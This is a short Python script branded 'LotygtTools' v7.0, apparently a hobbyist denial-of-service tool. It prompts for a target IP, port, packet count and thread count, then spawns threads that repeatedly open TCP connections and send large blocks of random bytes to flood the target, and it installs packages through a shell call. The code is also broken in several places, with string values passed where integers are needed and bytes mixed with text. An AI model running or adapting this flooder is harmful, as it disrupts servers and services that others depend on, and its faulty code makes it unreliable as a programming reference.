import random, socket, threading, time, os
os.system("pip install pysocks socks")
os.system("cls")
os.system('color' +random.choice(['d', 'c', 'a'])+ " & cls & title [+] LotygtTools")
print('''
.____           __           __________________
|    |    _____/  |_ ___.__./  _____\__    ___/
|    |   /  _ \   __<   |  /   \  ___ |    |   
|    |__(  <_> |  |  \___  \    \_\  \|    |   
|_______ \____/|__|  / ____|\______  /|____|   
        \/           \/            \/          
Coder:LotyGT
Owner:LotyGT
v7.0
''')
ip = str(input("[LotygtTools] IP Server = "))
port = str(input("[LotygtTools] IP Port = "))
times = str(input("[LotygtTools] Packet (119812) = "))
threads = str(input("[LotygtTools] Thread = "))

def run():
    data = random._urandom(119812) # Packet Size nya tod
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((ip, port))
            s.send(data)
            print("LotyGT Ddos Server Noob IP =>"+data+" packets to "+ip+".")
            for x in range(times):
                s.connect((ip, port))
                s.send(data)
        except socket.error:
            s.close()
            print(socket.error)

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
